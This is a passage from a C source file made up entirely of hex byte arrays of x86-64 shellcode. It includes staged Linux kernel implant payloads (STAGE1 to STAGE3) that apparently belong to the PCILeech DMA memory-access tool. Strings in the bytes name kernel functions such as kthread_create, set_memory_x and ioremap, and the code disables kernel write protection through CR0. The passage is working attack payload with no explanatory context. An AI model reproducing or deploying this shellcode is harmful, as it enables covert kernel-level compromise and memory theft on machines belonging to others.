  0x74, 0x47, 0x48, 0x8b, 0x4b, 0x18, 0x8b, 0x44, 0x24, 0x40, 0x48, 0x01, 0x41, 0x08, 0xeb, 0x1a,
  0x80, 0x7b, 0x02, 0x00, 0x74, 0x33, 0x48, 0x8b, 0xcb, 0xe8, 0x36, 0xff, 0xff, 0xff, 0x85, 0xc0,
  0x74, 0x1d, 0xb9, 0x0a, 0x00, 0x00, 0x00, 0xff, 0x53, 0x78, 0x48, 0x8b, 0x4b, 0x18, 0x48, 0x8b,
  0x43, 0x10, 0x48, 0x8b, 0x51, 0x08, 0x48, 0x2b, 0x50, 0x10, 0x48, 0x3b, 0xd6, 0x73, 0xd1, 0x80,
  0x7b, 0x02, 0x00, 0x0f, 0x85, 0x57, 0xff, 0xff, 0xff, 0x48, 0x8b, 0xcb, 0xe8, 0x0b, 0xfe, 0xff,
  0xff, 0x48, 0x8b, 0x5c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x30, 0x5e, 0xc3, 0x40, 0x53, 0x48, 0x83,
  0xec, 0x30, 0x80, 0x79, 0x02, 0x00, 0x48, 0x8b, 0xd9, 0x0f, 0x84, 0x87, 0x00, 0x00, 0x00, 0x48,
  0x8b, 0xcb, 0xe8, 0xdd, 0xfe, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x7b, 0x48, 0x8b, 0x53, 0x18, 0x48,
  0x8b, 0x4b, 0x10, 0x48, 0x8b, 0x42, 0x10, 0x48, 0x39, 0x41, 0x08, 0x75, 0x0a, 0xb9, 0x0a, 0x00,
  0x00, 0x00, 0xff, 0x53, 0x78, 0xeb, 0x55, 0x44, 0x8b, 0x41, 0x08, 0x48, 0x8d, 0x51, 0x68, 0x48,
  0x83, 0x64, 0x24, 0x20, 0x00, 0x44, 0x8b, 0xc8, 0x48, 0x8b, 0x4b, 0x20, 0x41, 0x81, 0xe1, 0xff,
  0x07, 0x00, 0x00, 0x41, 0x8b, 0xc1, 0x41, 0x81, 0xe0, 0xff, 0x07, 0x00, 0x00, 0x48, 0x03, 0xd0,
  0x48, 0x8b, 0x83, 0x80, 0x00, 0x00, 0x00, 0x45, 0x3b, 0xc8, 0x72, 0x06, 0x41, 0xb8, 0x00, 0x08,
  0x00, 0x00, 0x45, 0x2b, 0xc1, 0x4c, 0x8d, 0x4c, 0x24, 0x40, 0xff, 0xd0, 0x85, 0xc0, 0x74, 0x16,
  0x48, 0x8b, 0x4b, 0x18, 0x8b, 0x44, 0x24, 0x40, 0x48, 0x01, 0x41, 0x10, 0x80, 0x7b, 0x02, 0x00,
  0x0f, 0x85, 0x79, 0xff, 0xff, 0xff, 0x48, 0x8b, 0xcb, 0xe8, 0x5e, 0xfd, 0xff, 0xff, 0x48, 0x83,
  0xc4, 0x30, 0x5b, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x50, 0x48, 0x83, 0x79, 0x48, 0x00, 0x48,
  0x8b, 0xd9, 0x0f, 0x84, 0xd7, 0x00, 0x00, 0x00, 0x80, 0x79, 0x01, 0x00, 0x74, 0x79, 0x48, 0x83,
  0x64, 0x24, 0x38, 0x00, 0xba, 0x00, 0x20, 0x00, 0x00, 0xb9, 0x40, 0x00, 0x00, 0x00, 0xc7, 0x44,
  0x24, 0x30, 0x18, 0x00, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x40, 0x01, 0x00, 0x00, 0x00, 0xff, 0x93,
  0x88, 0x00, 0x00, 0x00, 0x48, 0x89, 0x43, 0x10, 0x48, 0x8d, 0x53, 0x20, 0x41, 0xb9, 0x00, 0x08,
  0x00, 0x00, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0x48, 0x8d, 0x88, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89,
  0x4b, 0x18, 0x48, 0xb9, 0x21, 0x95, 0xef, 0xdf, 0x32, 0x12, 0x65, 0x12, 0x48, 0x89, 0x08, 0x48,
  0x8b, 0x43, 0x18, 0x48, 0x89, 0x08, 0x48, 0x8d, 0x4b, 0x38, 0xff, 0x53, 0x50, 0x48, 0x8d, 0x53,
  0x30, 0x41, 0xb9, 0x00, 0x08, 0x00, 0x00, 0x48, 0x8d, 0x4b, 0x28, 0x4c, 0x8d, 0x44, 0x24, 0x30,
  0xff, 0x53, 0x50, 0xc6, 0x43, 0x02, 0x01, 0x48, 0x8b, 0xcb, 0xe8, 0x11, 0xfd, 0xff, 0xff, 0x85,
  0xc0, 0x75, 0x0a, 0x48, 0x8b, 0xcb, 0xe8, 0xb1, 0xfc, 0xff, 0xff, 0xeb, 0x3e, 0x80, 0x7b, 0x01,
  0x00, 0x74, 0x38, 0x48, 0x83, 0x64, 0x24, 0x28, 0x00, 0x4c, 0x8d, 0x05, 0x9c, 0xfe, 0xff, 0xff,
  0x83, 0x64, 0x24, 0x20, 0x00, 0x4c, 0x8b, 0xcb, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x53, 0x60, 0x48,
  0x83, 0x64, 0x24, 0x28, 0x00, 0x4c, 0x8d, 0x05, 0xa8, 0xfd, 0xff, 0xff, 0x83, 0x64, 0x24, 0x20,
  0x00, 0x4c, 0x8b, 0xcb, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x53, 0x60, 0xc6, 0x43, 0x03, 0xff, 0x48,
  0x83, 0xc4, 0x50, 0x5b, 0xc3
};

const BYTE LINUX_X64_STAGE1_BIN[] = {
    0xe8, 0xfb, 0xff, 0xff, 0xff
};

const BYTE LINUX_X64_STAGE2_BIN[] = {
    0xeb, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x58, 0x48, 0x83, 0xe8,
    0x05, 0x50, 0x57, 0x56, 0x52, 0x51, 0x41, 0x50, 0x41, 0x51, 0x0f, 0x20,
    0xc1, 0x51, 0x81, 0xe1, 0xff, 0xff, 0xfe, 0xff, 0x0f, 0x22, 0xc1, 0x48,
    0x8b, 0x15, 0xd2, 0xff, 0xff, 0xff, 0x48, 0x89, 0x10, 0xb0, 0x00, 0xb2,
    0x01, 0x48, 0x8d, 0x0d, 0xbe, 0xff, 0xff, 0xff, 0xf0, 0x0f, 0xb0, 0x11,
    0x75, 0x33, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x4c, 0x8b,
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8d, 0x35,
    0x9c, 0xff, 0xff, 0xff, 0x8b, 0x05, 0xa6, 0xff, 0xff, 0xff, 0x4c, 0x03,
    0xf0, 0xe8, 0x18, 0x00, 0x00, 0x00, 0x49, 0x8b, 0xe7, 0x41, 0x5f, 0x41,
    0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x58, 0x0f, 0x22, 0xc0, 0x41, 0x59, 0x41,
    0x58, 0x59, 0x5a, 0x5e, 0x5f, 0xc3, 0x48, 0x8d, 0x3d, 0xf8, 0x01, 0x00,
    0x00, 0x41, 0xff, 0xd6, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x0f, 0x01, 0x00,
    0x00, 0x48, 0xc7, 0xc7, 0x14, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x02,
    0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xf6, 0x00,
    0x00, 0x00, 0x48, 0x8b, 0xf8, 0xe8, 0x4d, 0x01, 0x00, 0x00, 0x4c, 0x8b,
    0xe8, 0x49, 0x8b, 0xfd, 0xe8, 0x19, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0xe0,
    0x48, 0x8d, 0x05, 0x2d, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x3d, 0xc3, 0x01,
    0x00, 0x00, 0x41, 0xff, 0xd6, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xc6, 0x00,
    0x00, 0x00, 0x49, 0x8b, 0xfc, 0x48, 0xc7, 0xc6, 0x02, 0x00, 0x00, 0x00,
    0xff, 0xd0, 0x49, 0x8b, 0xfc, 0xe8, 0x27, 0x01, 0x00, 0x00, 0x48, 0xc7,
    0xc7, 0x40, 0x00, 0x00, 0x00, 0x48, 0x83, 0xef, 0x08, 0x48, 0x8d, 0x05,
    0x22, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x04, 0x07, 0x49, 0x8b, 0xf4, 0x48,
    0x81, 0xc6, 0x00, 0x10, 0x00, 0x00, 0x48, 0x03, 0xf7, 0x48, 0x89, 0x06,
    0x48, 0x85, 0xff, 0x75, 0xdc, 0x48, 0x8d, 0x3d, 0x46, 0x01, 0x00, 0x00,
    0x41, 0xff, 0xd6, 0x48, 0x85, 0xc0, 0x74, 0x24, 0x49, 0x8b, 0xfc, 0x48,
    0x81, 0xc7, 0x00, 0x10, 0x00, 0x00, 0x48, 0x33, 0xf6, 0x48, 0x33, 0xd2,
    0x48, 0x83, 0xea, 0x01, 0x48, 0x8d, 0x0d, 0x89, 0x01, 0x00, 0x00, 0xff,
    0xd0, 0x48, 0x85, 0xc0, 0x74, 0x02, 0xeb, 0x2a, 0x48, 0x8d, 0x3d, 0x04,
    0x01, 0x00, 0x00, 0x41, 0xff, 0xd6, 0x48, 0x85, 0xc0, 0x74, 0x45, 0x49,
    0x8b, 0xfc, 0x48, 0x81, 0xc7, 0x00, 0x10, 0x00, 0x00, 0x48, 0x33, 0xf6,
    0x48, 0x8d, 0x15, 0x5d, 0x01, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x85, 0xc0,
    0x74, 0x2a, 0x49, 0x89, 0x44, 0x24, 0x58, 0x4d, 0x89, 0x74, 0x24, 0x10,
    0x48, 0x8d, 0x3d, 0x17, 0x01, 0x00, 0x00, 0x41, 0xff, 0xd6, 0x48, 0x85,
    0xc0, 0x74, 0x11, 0x49, 0x8b, 0x7c, 0x24, 0x58, 0xff, 0xd0, 0x48, 0x85,
    0xc0, 0x74, 0x05, 0x41, 0x8b, 0xc5, 0xeb, 0x05, 0xb8, 0xff, 0xff, 0xff,
    0xff, 0x0f, 0x20, 0xc1, 0x81, 0xe1, 0xff, 0xff, 0xfe, 0xff, 0x0f, 0x22,
    0xc1, 0x89, 0x05, 0x41, 0xfe, 0xff, 0xff, 0xc3, 0x48, 0x8d, 0x3d, 0xef,
    0x00, 0x00, 0x00, 0x41, 0xff, 0xd6, 0x48, 0x85, 0xc0, 0x74, 0x04, 0x48,
    0x8b, 0x00, 0xc3, 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x88, 0xff,
    0xff, 0xc3, 0x57, 0xe8, 0xdc, 0xff, 0xff, 0xff, 0x5f, 0x48, 0x03, 0xc7,
    0xc3, 0x48, 0x8d, 0x3d, 0xd7, 0x00, 0x00, 0x00, 0x41, 0xff, 0xd6, 0x48,
    0x85, 0xc0, 0x74, 0x04, 0x48, 0x8b, 0x00, 0xc3, 0x48, 0xb8, 0x00, 0x00,
    0x00, 0x00, 0x00, 0xea, 0xff, 0xff, 0xc3, 0x57, 0xe8, 0xdc, 0xff, 0xff,
    0xff, 0x5f, 0x48, 0x2b, 0xf8, 0x48, 0xc1, 0xef, 0x07, 0x48, 0xc1, 0xe7,
    0x0c, 0x48, 0x8b, 0xc7, 0xc3, 0x48, 0x33, 0xc0, 0xb9, 0x00, 0x04, 0x00,
    0x00, 0xfc, 0xf3, 0x48, 0xab, 0xc3, 0xeb, 0x07, 0x6d, 0x73, 0x6c, 0x65,
    0x65, 0x70, 0x00, 0x48, 0x8d, 0x3d, 0xf2, 0xff, 0xff, 0xff, 0x48, 0x8d,
    0x05, 0xf9, 0xef, 0xff, 0xff, 0x48, 0x8b, 0x00, 0xff, 0xd0, 0x48, 0xc7,
    0xc7, 0x64, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x8d, 0x05, 0xcc, 0xff,
    0xff, 0xff, 0x48, 0x8b, 0x00, 0x48, 0x83, 0xf8, 0x00, 0x74, 0xd4, 0x6b,
    0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5f, 0x63, 0x72, 0x65, 0x61, 0x74,
    0x65, 0x00, 0x6b, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5f, 0x63, 0x72,
    0x65, 0x61, 0x74, 0x65, 0x5f, 0x6f, 0x6e, 0x5f, 0x6e, 0x6f, 0x64, 0x65,
    0x00, 0x61, 0x6c, 0x6c, 0x6f, 0x63, 0x5f, 0x70, 0x61, 0x67, 0x65, 0x73,
    0x5f, 0x63, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x00, 0x73, 0x65, 0x74,
    0x5f, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x5f, 0x78, 0x00, 0x77, 0x61,
    0x6b, 0x65, 0x5f, 0x75, 0x70, 0x5f, 0x70, 0x72, 0x6f, 0x63, 0x65, 0x73,
    0x73, 0x00, 0x70, 0x61, 0x67, 0x65, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65,
    0x74, 0x5f, 0x62, 0x61, 0x73, 0x65, 0x00, 0x76, 0x6d, 0x65, 0x6d, 0x6d,
    0x61, 0x70, 0x5f, 0x62, 0x61, 0x73, 0x65, 0x00, 0x70, 0x63, 0x69, 0x6c,
    0x65, 0x65, 0x63, 0x68, 0x00
};

const BYTE LINUX_X64_STAGE3_BIN[] = {
  0xeb, 0x07, 0x6d, 0x73, 0x6c, 0x65, 0x65, 0x70, 0x00, 0x48, 0x8d, 0x3d, 0xf2, 0xff, 0xff, 0xff,
  0x48, 0x8d, 0x05, 0xf9, 0xef, 0xff, 0xff, 0x48, 0x8b, 0x00, 0xff, 0xd0, 0x48, 0xc7, 0xc7, 0x64,
  0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x8d, 0x05, 0xcc, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x00, 0x48,
  0x83, 0xf8, 0x00, 0x74, 0xd4, 0x48, 0x8d, 0x0d, 0xc4, 0xef, 0xff, 0xff, 0x41, 0x57, 0x4c, 0x8b,
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0xe8, 0x1e, 0x04, 0x00, 0x00, 0x49, 0x8b,
  0xe7, 0x41, 0x5f, 0xc3, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x4c, 0x8b, 0xf9, 0x4c, 0x8b, 0xf2,
  0x49, 0xc7, 0xc5, 0x68, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x05, 0x94, 0xff, 0xff, 0xff, 0x50, 0x48,
  0x8d, 0x05, 0x87, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05, 0x93, 0x00, 0x00, 0x00, 0x50, 0x48,
  0x8d, 0x05, 0x98, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05, 0x9d, 0x00, 0x00, 0x00, 0x50, 0x48,
  0x8d, 0x05, 0x9c, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05, 0x9d, 0x00, 0x00, 0x00, 0x50, 0x48,
  0x8d, 0x05, 0xc3, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05, 0xd1, 0x00, 0x00, 0x00, 0x50, 0x48,
  0x8d, 0x05, 0xd1, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05, 0xe1, 0x00, 0x00, 0x00, 0x50, 0x48,
  0x8d, 0x05, 0xc9, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05, 0xe5, 0x00, 0x00, 0x00, 0x50, 0x49,
  0x83, 0xed, 0x08, 0x49, 0x8b, 0xcf, 0x5a, 0xe8, 0xe8, 0x00, 0x00, 0x00, 0x4b, 0x89, 0x04, 0x2e,
  0x4d, 0x85, 0xed, 0x75, 0xea, 0x49, 0x8b, 0x46, 0x48, 0x48, 0x85, 0xc0, 0x75, 0x08, 0x49, 0x8b,
  0x46, 0x58, 0x49, 0x89, 0x46, 0x48, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3, 0x61, 0x6c, 0x6c,
  0x6f, 0x63, 0x5f, 0x70, 0x61, 0x67, 0x65, 0x73, 0x5f, 0x63, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74,
  0x00, 0x73, 0x65, 0x74, 0x5f, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x5f, 0x78, 0x00, 0x5f, 0x5f,
  0x66, 0x72, 0x65, 0x65, 0x5f, 0x70, 0x61, 0x67, 0x65, 0x73, 0x00, 0x6d, 0x65, 0x6d, 0x63, 0x70,
  0x79, 0x00, 0x73, 0x63, 0x68, 0x65, 0x64, 0x75, 0x6c, 0x65, 0x00, 0x64, 0x6f, 0x5f, 0x67, 0x65,
  0x74, 0x74, 0x69, 0x6d, 0x65, 0x6f, 0x66, 0x64, 0x61, 0x79, 0x00, 0x70, 0x61, 0x67, 0x65, 0x5f,
  0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x5f, 0x62, 0x61, 0x73, 0x65, 0x00, 0x76, 0x6d, 0x65, 0x6d,
  0x6d, 0x61, 0x70, 0x5f, 0x62, 0x61, 0x73, 0x65, 0x00, 0x77, 0x61, 0x6c, 0x6b, 0x5f, 0x73, 0x79,
  0x73, 0x74, 0x65, 0x6d, 0x5f, 0x72, 0x61, 0x6d, 0x5f, 0x72, 0x61, 0x6e, 0x67, 0x65, 0x00, 0x69,
  0x6f, 0x75, 0x6e, 0x6d, 0x61, 0x70, 0x00, 0x69, 0x6f, 0x72, 0x65, 0x6d, 0x61, 0x70, 0x00, 0x69,
  0x6f, 0x72, 0x65, 0x6d, 0x61, 0x70, 0x5f, 0x6e, 0x6f, 0x63, 0x61, 0x63, 0x68, 0x65, 0x00, 0x6b,
  0x74, 0x69, 0x6d, 0x65, 0x5f, 0x67, 0x65, 0x74, 0x5f, 0x72, 0x65, 0x61, 0x6c, 0x5f, 0x74, 0x73,
  0x36, 0x34, 0x00, 0x67, 0x65, 0x74, 0x6e, 0x73, 0x74, 0x69, 0x6d, 0x65, 0x6f, 0x66, 0x64, 0x61,
  0x79, 0x36, 0x34, 0x00, 0x48, 0x8b, 0xc1, 0x57, 0x56, 0x48, 0x8b, 0xfa, 0x49, 0x8b, 0xf0, 0x49,
  0x8b, 0xd1, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x4c, 0x8b, 0x44, 0x24, 0x40, 0x4c, 0x8b, 0x4c, 0x24,
  0x48, 0x41, 0x57, 0x4c, 0x8b, 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0xff, 0xd0,
  0x49, 0x8b, 0xe7, 0x41, 0x5f, 0x5e, 0x5f, 0xc3, 0x48, 0x8b, 0xc7, 0x48, 0x8d, 0x3d, 0x49, 0xff,
  0xff, 0xff, 0xff, 0xd0, 0x48, 0x85, 0xc0, 0x74, 0x04, 0x48, 0x8b, 0x00, 0xc3, 0x48, 0xb8, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x88, 0xff, 0xff, 0xc3, 0x57, 0x56, 0x41, 0x57, 0x48, 0x8b, 0xf9, 0x4c,
  0x8b, 0xfa, 0xe8, 0xd1, 0xff, 0xff, 0xff, 0x49, 0x03, 0xc7, 0x41, 0x5f, 0x5e, 0x5f, 0xc3, 0x48,
  0x8b, 0xc7, 0x48, 0x8d, 0x3d, 0x23, 0xff, 0xff, 0xff, 0xff, 0xd0, 0x48, 0x85, 0xc0, 0x74, 0x04,
  0x48, 0x8b, 0x00, 0xc3, 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0xff, 0xff, 0xc3, 0x57,
  0x56, 0x52, 0x48, 0x8b, 0xf9, 0xe8, 0xd5, 0xff, 0xff, 0xff, 0x5a, 0x48, 0x2b, 0xd0, 0x48, 0xc1,
  0xea, 0x07, 0x48, 0xc1, 0xe2, 0x0c, 0x48, 0x8b, 0xc2, 0x5e, 0x5f, 0xc3, 0x48, 0xc1, 0xe7, 0x0c,
  0x48, 0xc1, 0xe6, 0x0c, 0x48, 0x8b, 0x42, 0x28, 0x48, 0x8b, 0x4a, 0x48, 0x48, 0x03, 0xc1, 0x48,
  0x89, 0x38, 0x48, 0x89, 0x70, 0x08, 0x48, 0x83, 0xc1, 0x10, 0x48, 0x89, 0x4a, 0x48, 0x48, 0x33,
  0xc0, 0xc3, 0x48, 0xc1, 0xe7, 0x0c, 0x48, 0xc1, 0xe6, 0x0c, 0x4c, 0x8b, 0x42, 0x40, 0x4c, 0x8b,
  0x4a, 0x48, 0x48, 0x03, 0xf7, 0x4d, 0x03, 0xc8, 0x4c, 0x3b, 0xc7, 0x7c, 0x09, 0x4c, 0x3b, 0xce,
  0x7f, 0x04, 0x48, 0x33, 0xc0, 0xc3, 0x48, 0x33, 0xc0, 0x48, 0xff, 0xc0, 0xc3, 0x0f, 0x09, 0xc3,
  0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x50, 0x8b,
  0xf2, 0x48, 0x8b, 0xd9, 0x33, 0xff, 0x48, 0x8b, 0x8b, 0x08, 0x03, 0x00, 0x00, 0xba, 0x14, 0x00,
  0x00, 0x00, 0x44, 0x8d, 0x42, 0xf6, 0xe8, 0xd9, 0xfe, 0xff, 0xff, 0x48, 0x89, 0x44, 0x3c, 0x30,
  0x48, 0x85, 0xc0, 0x74, 0x0c, 0x48, 0x8b, 0x4b, 0x10, 0x48, 0x8b, 0xd0, 0xe8, 0x4e, 0xff, 0xff,
  0xff, 0x48, 0x89, 0x44, 0x3c, 0x20, 0x48, 0x83, 0xc7, 0x08, 0x48, 0x83, 0xff, 0x10, 0x72, 0xc6,
  0x48, 0x8b, 0x4c, 0x24, 0x28, 0x48, 0x8b, 0x7c, 0x24, 0x20, 0x48, 0x8d, 0x81, 0x00, 0x00, 0x20,
  0x00, 0x48, 0x3b, 0xf8, 0x75, 0x16, 0x48, 0x8b, 0x44, 0x24, 0x38, 0x48, 0xc7, 0x43, 0x18, 0x00,
  0x00, 0x40, 0x00, 0x48, 0x89, 0x4b, 0x20, 0xe9, 0xa9, 0x00, 0x00, 0x00, 0x48, 0x85, 0xff, 0x75,
  0x05, 0x48, 0x85, 0xc9, 0x74, 0x2b, 0x85, 0xf6, 0x75, 0x2b, 0x33, 0xff, 0x48, 0x8b, 0x54, 0xfc,
  0x30, 0x48, 0x85, 0xd2, 0x74, 0x12, 0x48, 0x8b, 0x8b, 0x18, 0x03, 0x00, 0x00, 0x41, 0xb8, 0x0a,
  0x00, 0x00, 0x00, 0xe8, 0x5c, 0xfe, 0xff, 0xff, 0x48, 0xff, 0xc7, 0x48, 0x83, 0xff, 0x02, 0x72,
  0xdb, 0x33, 0xc0, 0xeb, 0x70, 0x33, 0xd2, 0x48, 0x8b, 0xcb, 0xe8, 0x41, 0xff, 0xff, 0xff, 0x48,
  0x89, 0x44, 0x24, 0x40, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x74, 0x2c, 0x33, 0xff, 0x48, 0x8b,
  0x54, 0xfc, 0x30, 0x48, 0x85, 0xd2, 0x74, 0x12, 0x48, 0x8b, 0x8b, 0x18, 0x03, 0x00, 0x00, 0x41,
  0xb8, 0x0a, 0x00, 0x00, 0x00, 0xe8, 0x1a, 0xfe, 0xff, 0xff, 0x48, 0xff, 0xc7, 0x48, 0x83, 0xff,
  0x02, 0x72, 0xdb, 0x48, 0x8b, 0xc6, 0xeb, 0x2d, 0x48, 0x8b, 0x54, 0x24, 0x38, 0x48, 0x85, 0xd2,
  0x74, 0x12, 0x48, 0x8b, 0x8b, 0x18, 0x03, 0x00, 0x00, 0x41, 0xb8, 0x0a, 0x00, 0x00, 0x00, 0xe8,
  0xf0, 0xfd, 0xff, 0xff, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x48, 0xc7, 0x43, 0x18, 0x00, 0x00, 0x20,
  0x00, 0x48, 0x89, 0x7b, 0x20, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0x74, 0x24, 0x68, 0x48,
  0x83, 0xc4, 0x50, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x57, 0x48, 0x83,
  0xec, 0x20, 0x48, 0x8d, 0xb9, 0x00, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0x49, 0x10,
  0x48, 0x8b, 0xd7, 0xe8, 0x3c, 0xfc, 0xff, 0xff, 0x48, 0x8b, 0x83, 0x30, 0x03, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x75, 0x21, 0x48, 0x8b, 0x83, 0x50, 0x03, 0x00, 0x00, 0x48, 0x89, 0x83, 0x30, 0x03,
  0x00, 0x00, 0x48, 0x85, 0xc0, 0x75, 0x0e, 0x48, 0x8b, 0x83, 0x60, 0x03, 0x00, 0x00, 0x48, 0x89,
  0x83, 0x30, 0x03, 0x00, 0x00, 0x33, 0xc9, 0x8d, 0x41, 0x01, 0x48, 0x83, 0x3f, 0x00, 0x74, 0x0d,
  0x03, 0xc8, 0x48, 0x83, 0xc7, 0x08, 0x83, 0xf9, 0x0a, 0x72, 0xef, 0xeb, 0x02, 0x33, 0xc0, 0x48,
  0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48,
  0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41,
  0x57, 0x48, 0x83, 0xec, 0x50, 0x48, 0xb8, 0x77, 0x33, 0x33, 0x11, 0x77, 0x33, 0x11, 0xff, 0x48,
  0xc7, 0x41, 0x50, 0x02, 0x00, 0x00, 0x00, 0x48, 0x89, 0x01, 0x48, 0x8b, 0xd9, 0xe8, 0x56, 0xff,
  0xff, 0xff, 0x85, 0xc0, 0x75, 0x0e, 0xb8, 0x01, 0x00, 0x00, 0xf0, 0x48, 0x89, 0x43, 0x30, 0xe9,
  0x70, 0x02, 0x00, 0x00, 0x41, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0x41, 0x8b, 0xd7,
  0xe8, 0xfb, 0xfd, 0xff, 0xff, 0x48, 0x8b, 0xe8, 0x48, 0x85, 0xc0, 0x75, 0x07, 0xb8, 0x02, 0x00,
  0x00, 0xf0, 0xeb, 0xd7, 0x48, 0x8b, 0x53, 0x20, 0x48, 0x8b, 0x4b, 0x10, 0xe8, 0x37, 0xfd, 0xff,
  0xff, 0x4c, 0x8b, 0x43, 0x18, 0x48, 0x8b, 0xd0, 0x48, 0x8b, 0x8b, 0x10, 0x03, 0x00, 0x00, 0x49,
  0xc1, 0xe8, 0x0c, 0x48, 0x89, 0x43, 0x28, 0xe8, 0xc8, 0xfc, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x30,
  0x03, 0x00, 0x00, 0x48, 0x8d, 0x54, 0x24, 0x30, 0xe8, 0xb7, 0xfc, 0xff, 0xff, 0x48, 0x8b, 0x8b,
  0x28, 0x03, 0x00, 0x00, 0x4c, 0x89, 0x7b, 0x30, 0xe8, 0xa7, 0xfc, 0xff, 0xff, 0x48, 0x8b, 0x83,
  0xf8, 0x0f, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x75, 0x34, 0x48, 0x8b, 0x8b, 0x30, 0x03, 0x00, 0x00,
  0x48, 0x8d, 0x54, 0x24, 0x40, 0xe8, 0x8a, 0xfc, 0xff, 0xff, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x48,
  0x83, 0xc0, 0x05, 0x48, 0x39, 0x44, 0x24, 0x40, 0x76, 0xc3, 0x48, 0x8b, 0x8b, 0x00, 0x03, 0x00,
  0x00, 0xba, 0x64, 0x00, 0x00, 0x00, 0xe8, 0x69, 0xfc, 0xff, 0xff, 0xeb, 0xb0, 0x48, 0xc7, 0x43,
  0x30, 0x02, 0x00, 0x00, 0x00, 0x48, 0x83, 0xf8, 0x03, 0x0f, 0x84, 0x7d, 0x01, 0x00, 0x00, 0x48,
  0x83, 0xf8, 0x04, 0x75, 0x3c, 0x48, 0x8b, 0x8b, 0x38, 0x03, 0x00, 0x00, 0x48, 0x85, 0xc9, 0x74,
  0x27, 0x48, 0x83, 0x63, 0x48, 0x00, 0x48, 0x8d, 0x05, 0xdf, 0xfc, 0xff, 0xff, 0x4c, 0x8b, 0xcb,
  0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0x83, 0xc8, 0xff, 0x33, 0xd2, 0xe8, 0x24, 0xfc, 0xff, 0xff,
  0x33, 0xc9, 0x48, 0x85, 0xc0, 0x0f, 0x94, 0xc1, 0x48, 0x89, 0x4b, 0x38, 0xe8, 0x0c, 0xfd, 0xff,
  0xff, 0x48, 0x8b, 0x83, 0xf8, 0x0f, 0x00, 0x00, 0x48, 0x83, 0xf8, 0x05, 0x75, 0x1f, 0x4c, 0x8d,
  0x83, 0x20, 0x02, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0x48, 0x8d, 0x93, 0x20, 0x01, 0x00, 0x00, 0xff,
  0x53, 0x28, 0x48, 0x8b, 0x83, 0xf8, 0x0f, 0x00, 0x00, 0x4c, 0x89, 0x7b, 0x38, 0x48, 0xff, 0xc8,
  0x49, 0x3b, 0xc7, 0x0f, 0x87, 0xa4, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x43, 0x48, 0x48, 0x8d, 0x05,
